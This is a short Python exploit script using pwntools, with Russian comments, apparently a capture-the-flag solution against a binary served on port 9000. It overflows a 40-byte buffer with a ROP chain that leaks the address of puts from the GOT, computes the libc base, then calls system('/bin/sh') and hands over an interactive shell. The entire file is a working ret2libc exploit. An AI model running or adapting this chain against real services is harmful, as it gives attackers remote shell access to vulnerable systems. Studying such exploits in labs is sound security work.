from pwn import *

# Указываем путь к бинарнику для автоматического парсинга символов
context.binary = elf = ELF('../app/main')  # './main' - путь к вашему бинарнику

# Если используете свою libc (из докера)
libc = ELF('./libc.so.6')  # предварительно скопируйте libc из контейнера

p = remote('0.0.0.0', 9000)

# 1. Leak libc address через puts@got
pop_rdi = 0x40114a          # Адрес pop rdi; ret
ret = 0x401016              # Адрес ret для выравнивания стека

payload = flat(
    b'A'*40,                # Переполнение буфера
    pop_rdi,
    elf.got['puts'],        # Теперь используем правильный синтаксис
    elf.plt['puts'],
    elf.symbols['main']     # Возврат в main для второго этапа
)

p.sendlineafter(b"!\n", payload)

# Получаем утечку и вычисляем базовый адрес libc
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
print(f"Libc base: {hex(libc.address)}")

# 2. Вызываем system("/bin/sh")
payload = flat(
    b'A'*40,
    ret,                    # Выравнивание стека для системных вызовов
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.symbols['system']
)

p.sendline(payload)
p.interactive()